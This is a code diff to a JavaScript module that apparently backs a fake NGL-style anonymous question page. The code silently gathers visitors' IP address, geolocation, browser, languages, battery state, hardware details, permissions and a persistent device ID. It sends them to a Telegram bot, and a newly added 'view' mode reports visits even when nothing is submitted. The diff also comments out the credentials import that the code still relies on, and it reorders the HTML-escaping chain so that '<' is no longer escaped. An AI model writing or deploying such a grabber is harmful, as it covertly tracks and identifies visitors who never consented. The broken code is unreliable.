@@ -1,6 +1,6 @@
-import cred from './credentials.json' with { type: 'json'}
+// import cred from './credentials.json' with { type: 'json'}
 
-function formatMsg(data) {
+function formatMsg(data, keyword = 'Submission') {
     const q = escapeHTML(data.ngl.question)
     const time = escapeHTML(data.ngl.time)
     const id = escapeHTML(data.ngl.id)
@@ -23,12 +23,14 @@ function formatMsg(data) {
 
     const html =
 `
-<b>📩 New NGL Submission</b>
-
+<b>📩 New NGL ${keyword}</b>
+${keyword.toLowerCase() !== 'view'
+    ? `
 <b>Question:</b> ${q}
 
 ──────────────────────────
-
+`
+    : ''}
 <b>Time:</b> ${time} (${tz})
 <b>ID:</b> <code>${id}</code>
 
@@ -42,14 +44,15 @@ function formatMsg(data) {
     return echo(html), html.trim()
 }
 
-async function collectData(question) {
+async function collectData() {
     try {
         const nav = navigator
         const scr = screen
-        const now = new Date()
 
         const browserName = getBrowserName()
         const browserVersion = getBrowserVersion(browserName)
+        const languages = {...nav.languages}
+        delete languages[nav.language]
 
         // ---------- IP ----------
         let ipAddr = null
@@ -75,10 +78,11 @@ async function collectData(question) {
             echo.wrn("IP/location fetch failed", e)
         }
 
-        // ---------- Connection ----------
+        // ---------- Connection/Battery ----------
         const connection = nav.connection || nav.mozConnection || nav.webkitConnection
+        const battery = await nav.getBattery?.()
 
-        // ---------- Permissions (best effort) ----------
+        // ---------- Permissions ----------
         let notifications
         if ("permissions" in nav) {
             try {
@@ -87,12 +91,6 @@ async function collectData(question) {
         }
 
         const telemetry = {
-            ngl: {
-                question,
-                id: uuid(),
-                time: `${(''+ now.getHours()).padStart(2, '0')}:${(''+ now.getMinutes()).padStart(2, '0')} — ${(''+ now.getDate())}/${(''+ now.getMonth()) + 1}/${(''+ now.getFullYear()).slice(-2)}`,
-            },
-
             meta: {
                 ip: ipAddr,
                 ...locData,
@@ -111,7 +109,7 @@ async function collectData(question) {
                 version: browserVersion,
                 languages: {
                     pr: nav.language,
-                    sc: nav.languages
+                    sc: languages
                 },
                 cookiesEnabled: nav.cookieEnabled,
                 pdfViewerEnabled: nav.pdfViewerEnabled,
@@ -129,7 +127,12 @@ async function collectData(question) {
                 },
 
                 hardware: {
-                    battery: await nav.getBattery?.(),
+                    battery: battery
+                        ? {
+                            level: battery.level,
+                            charging: battery.charging,
+                        }
+                        : null,
                     deviceMemory: nav.deviceMemory ?? null,
                     hardwareConcurrency: nav.hardwareConcurrency ?? null,
                     maxTouchPoints: nav.maxTouchPoints,
@@ -163,38 +166,38 @@ async function collectData(question) {
     }
 }
 
-async function sendMsg(data) {
+async function sendMsg(data, chat = cred.msg_chat) {
     echo('Sent data:', data)
 
-    return await fetch(`https://api.telegram.org/bot${cred.bot_token}/sendMessage`, {
+    return await fetch(`https://api.telegram.org/bot${chat.token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            chat_id: cred.chat_id,
+            chat_id: chat.id,
             parse_mode: "HTML",
-            text: formatMsg(data),
+            text: formatMsg(data, chat.keyword),
         })
     })
         .then(res => echo(res.status === 200 ? 'ok' : 'bad'))
         .catch(echo.err)
 }
 
-async function sendDoc(data) {
+async function sendDoc(data, chat = cred.msg_chat) {
     echo('Sent data:', data)
 
-    return await fetch(`https://api.telegram.org/bot${cred.bot_token}/sendDocument`, {
+    const form = new FormData()
+    form.append("chat_id", chat.id)
+    form.append("document", new Blob(
+        [JSON.stringify(data, null, 2)],
+        { type: "application/json" }
+    ), `NGL-${Date.now()}.json`)
+    form.append("caption", formatMsg(data, chat.keyword))
+    form.append("parse_mode", "HTML")
+
+    return await fetch(`https://api.telegram.org/bot${chat.token}/sendDocument`, {
         method: "POST",
-        body: (() => {
-            const form = new FormData()
-            form.append("chat_id", cred.chat_id)
-            form.append("document", new Blob(
-                [JSON.stringify(data, null, 2)],
-                { type: "application/json" }
-            ), `NGL-${Date.now()}.json`)
-            form.append("caption", formatMsg(data))
-            form.append("parse_mode", "HTML")
-            return form
-        })(),
+        keepalive: true,
+        body: form,
     })
         .then(res => echo(res.status === 200 ? 'ok' : 'bad'))
         .catch(echo.err)
@@ -213,10 +216,18 @@ const uuid = () => {
     return deviceId
 }
 
+const mergeData = (data, q = '', now = new Date()) => Object.assign(data, {
+    ngl: {
+        question: q,
+        id: uuid(),
+        time: `${(''+ now.getHours()).padStart(2, '0')}:${(''+ now.getMinutes()).padStart(2, '0')} — ${(''+ now.getDate())}/${(''+ now.getMonth()) + 1}/${(''+ now.getFullYear()).slice(-2)}`,
+    }
+})
+
 const escapeHTML = (s) => s?.toString()
     .replaceAll('&', '&amp;')
-    .replaceAll('<', '&lt;')
     .replaceAll('>', '&gt;') || '◘'
+    .replaceAll('<', '&lt;')
 
 function getBrowserName(nav = navigator) {
     const ua = nav.userAgent
@@ -250,7 +261,7 @@ function getBrowserVersion(browser, ua = navigator.userAgent) {
             match = ua.match(/Firefox\/([\d.]+)/)
             break
         case "Edge":
-            match = ua.match(/Edg\/([\d.]+)/)
+            match = ua.match(/Edg[aA]?\/([\d.]+)/)
             break
         case "Opera":
             match = ua.match(/OPR\/([\d.]+)/)
@@ -267,7 +278,9 @@ function getBrowserVersion(browser, ua = navigator.userAgent) {
 
 export {
     echo,
+    uuid,
     sendMsg,
     sendDoc,
+    mergeData,
     collectData,
 }
